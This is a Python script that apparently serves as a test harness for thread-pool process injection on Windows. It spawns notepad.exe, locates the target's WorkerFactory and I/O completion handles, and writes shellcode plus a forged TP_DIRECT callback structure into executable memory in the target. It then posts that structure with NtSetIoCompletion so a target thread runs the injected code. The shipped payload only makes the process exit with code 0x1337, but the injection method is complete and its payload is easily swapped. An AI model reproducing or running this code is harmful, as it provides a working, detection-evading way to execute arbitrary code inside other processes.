# -*- coding: utf-8 -*-
"""tpd_harness2.py - TP_DIRECT injection, WorkerFactory route:
  1. discover the WorkerFactory ObjectTypeIndex via CreateThreadpool in-process
  2. enumerate the target's WorkerFactory handles
  3. NtQueryInformationWorkerFactory -> find IoCompletionHandle (candidate
     validated against the target's own handle set)
  4. TP_DIRECT {RefCount=1, Callback@off=payload}, NtSetIoCompletion(dup, direct)
PASS = target exit 0x1337."""
import ctypes
import os
import struct
import subprocess
import sys
import time
from ctypes import wintypes

ntdll = ctypes.windll.ntdll
k32 = ctypes.windll.kernel32

k32.GetModuleHandleW.restype = ctypes.c_void_p
k32.GetProcAddress.restype = ctypes.c_void_p
k32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
k32.VirtualAllocEx.restype = ctypes.c_void_p
k32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
k32.OpenProcess.restype = wintypes.HANDLE
k32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
k32.DuplicateHandle.argtypes = [wintypes.HANDLE, wintypes.HANDLE, wintypes.HANDLE,
                                ctypes.POINTER(wintypes.HANDLE), wintypes.DWORD,
                                wintypes.BOOL, wintypes.DWORD]
k32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPVOID,
                                   ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
k32.VirtualProtectEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t,
                                 wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
ntdll.NtQuerySystemInformation.argtypes = [ctypes.c_uint, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
ntdll.NtQueryInformationWorkerFactory.argtypes = [wintypes.HANDLE, ctypes.c_uint, ctypes.c_void_p,
                                                  ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
ntdll.NtSetIoCompletion.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p]
ntdll.NtSetIoCompletion.restype = ctypes.c_long
ntdll.NtQueryObject.argtypes = [wintypes.HANDLE, ctypes.c_uint, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]

PROCESS_ALL = 0x1F0FFF
DUPLICATE_SAME_ACCESS = 2
MEM_COMMIT, MEM_RESERVE, PAGE_RW, PAGE_ERW = 0x1000, 0x2000, 4, 0x40
WorkerFactoryBasicInformation = 8


def probe_payload():
    h = k32.GetModuleHandleW("kernel32.dll")
    ep = k32.GetProcAddress(h, b"ExitProcess")
    spin = (b"\x48\xb8" + struct.pack("<Q", 0x080000000) + b"\x48\xff\xc8" + b"\x75\xfb")
    return (b"\x48\x83\xec\x28" + spin + b"\xb9\x37\x13\x00\x00"
            + b"\x48\xb8" + struct.pack("<Q", ep) + b"\xff\xd0")


def extended_handles():
    """all (pid, handle, type_idx) via SystemExtendedHandleInformation"""
    n = 0x1000000
    buf = ctypes.create_string_buffer(n)
    ret = ctypes.c_ulong(0)
    st = ntdll.NtQuerySystemInformation(64, buf, n, ctypes.byref(ret))
    raw = buf.raw[:ret.value]
    count = struct.unpack_from("<Q", raw, 0)[0]
    out = []
    off = 16
    for i in range(count):
        obj, epid, ehandle, acc, bt, tidx = struct.unpack_from("<QQQIHH", raw, off)
        off += 40
        if ehandle <= 0xFFFFFFFF:
            out.append((epid, ehandle, tidx))
    return out


def main():
    off = 0x08
    for a in sys.argv:
        if a.startswith("--off="):
            off = int(a.split("=")[1], 16)
    print("Callback offset +0x%x" % off)

    # 1. our own worker factory -> the WorkerFactory type index
    pool = ctypes.c_void_p(0)
    ntdll.TpAllocPool.argtypes = [ctypes.POINTER(ctypes.c_void_p), ctypes.c_void_p]
    st0 = ntdll.TpAllocPool(ctypes.byref(pool), None)
    assert st0 == 0 and pool.value, "TpAllocPool 0x%x" % (st0 & 0xffffffff)
    # force at least the factory to exist: TpSetPoolMaxThreads
    ntdll.TpSetPoolMaxThreads.argtypes = [ctypes.c_void_p, ctypes.c_int]
    ntdll.TpSetPoolMaxThreads(pool, 2)

    ext = extended_handles()
    me = k32.GetCurrentProcessId()
    # type index candidates for MY WorkerFactory: entries of my pid whose type
    # index is shared with many processes (worker factories are common)
    from collections import Counter
    my_types = Counter(t for (p, h, t) in ext if p == me)
    all_types = Counter(t for (p, h, t) in ext)
    # the worker factory type = type indices present in my pool handles...
    # safer: NtQueryObject my own handles to get the type NAME
    wf_idx = None
    for (p, h, t) in ext:
        if p != me:
            continue
        buf2 = ctypes.create_string_buffer(512)
        r2 = ctypes.c_ulong(0)
        # ObjectTypeInformation = 1
        st2 = ntdll.NtQueryObject(wintypes.HANDLE(h), 1, buf2, 512, ctypes.byref(r2))
        if st2 != 0:
            continue
        ln = struct.unpack_from("<H", buf2.raw, 0)[0]
        name = buf2.raw[8 + 8:8 + 8 + ln].decode("utf-16-le", "replace") if ln else ""
        if name == "WorkerFactory":
            wf_idx = t
            break
    print("WorkerFactory type index:", wf_idx)
    ntdll.TpReleasePool(pool)

    # 2. target
    tgt = subprocess.Popen([os.path.join(os.environ["SystemRoot"], "System32", "notepad.exe")],
                           creationflags=0x08000000)
    time.sleep(2)
    hp = k32.OpenProcess(PROCESS_ALL, False, tgt.pid)
    print("target pid", tgt.pid)

    ext2 = extended_handles()
    target_handle_set = set(h for (p, h, t) in ext2 if p == tgt.pid)
    print("target handles:", len(target_handle_set))

    # 3. behavioral WorkerFactory discovery: dup every target handle and try
    #    NtQueryInformationWorkerFactory - succeeds ONLY on factory objects
    info = ctypes.create_string_buffer(0x200)
    r3 = ctypes.c_ulong(0)
    wf_handles = []
    iocp_cands = []
    for h in sorted(target_handle_set):
        dup = wintypes.HANDLE(0)
        if not k32.DuplicateHandle(hp, wintypes.HANDLE(h), k32.GetCurrentProcess(),
                                   ctypes.byref(dup), 0, False, DUPLICATE_SAME_ACCESS):
            continue
        r3.value = 0
        st3 = ntdll.NtQueryInformationWorkerFactory(dup, WorkerFactoryBasicInformation,
                                                    info, 0x200, ctypes.byref(r3))
        if st3 == 0:
            wf_handles.append(h)
            blob = info.raw[:r3.value or 0x200]
            for o in range(0, len(blob) - 8, 8):
                v = struct.unpack_from("<Q", blob, o)[0]
                if 0 < v <= 0xFFFF and v in target_handle_set:
                    iocp_cands.append((h, o, v))
        k32.CloseHandle(dup)
    print("WorkerFactory handles:", wf_handles)
    print("IoCompletion candidates (factory, info_off, handle):",
          [(hex(a), hex(b), hex(c)) for a, b, c in iocp_cands][:8])

    # 4. payload + TP_DIRECT
    pay = probe_payload()
    pay_va = k32.VirtualAllocEx(hp, None, 0x200, MEM_COMMIT | MEM_RESERVE, PAGE_ERW)
    dva = k32.VirtualAllocEx(hp, None, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_RW)
    got = ctypes.c_size_t(0)
    k32.WriteProcessMemory(hp, ctypes.c_void_p(pay_va), pay, len(pay), ctypes.byref(got))
    direct = bytearray(0x60)
    struct.pack_into("<I", direct, 0, 1)
    struct.pack_into("<Q", direct, off, pay_va)
    k32.WriteProcessMemory(hp, ctypes.c_void_p(dva), bytes(direct), len(direct), ctypes.byref(got))
    print("payload=0x%x direct=0x%x" % (pay_va, dva))

    # 5. post
    for (wh, o, v) in iocp_cands:
        dup2 = wintypes.HANDLE(0)
        if not k32.DuplicateHandle(hp, wintypes.HANDLE(v), k32.GetCurrentProcess(),
                                   ctypes.byref(dup2), 0, False, DUPLICATE_SAME_ACCESS):
            continue
        st4 = ntdll.NtSetIoCompletion(ctypes.c_void_p(dup2.value), ctypes.c_void_p(dva), None, None, None)
        k32.CloseHandle(dup2)
        print("post via factory 0x%x iocp 0x%x (info+0x%x): st=0x%x" % (wh, v, o, st4 & 0xFFFFFFFF))

    code = wintypes.DWORD()
    t0 = time.time()
    alive = True
    while time.time() - t0 < 25:
        if k32.GetExitCodeProcess(hp, ctypes.byref(code)) and code.value != 259:
            alive = False
            break
        time.sleep(0.5)
    print("exit=0x%x alive=%s verdict=%s" % (code.value, alive,
                                             "PASS" if code.value == 0x1337 else "FAIL"))
    if alive:
        tgt.kill()
    return 0


if __name__ == "__main__":
    main()
